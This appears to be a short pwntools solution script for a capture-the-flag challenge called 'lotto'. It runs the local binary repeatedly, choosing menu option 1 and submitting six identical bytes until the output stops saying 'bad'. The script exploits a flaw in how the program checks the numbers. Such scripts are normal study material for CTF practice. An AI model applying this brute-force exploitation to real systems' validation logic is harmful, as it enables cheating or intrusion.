#!/usr/bin/python   
from pwn import *  
target = process("./lotto")  
flag = 2  
while flag:  
    s = target.readuntil("Exit\n")  
    if "bad" not in s:  
        print s  
        flag -= 1  
    target.sendline("1")  
    k = target.read()  
    target.sendline(chr(43)*6)  

    # run it in /tmp  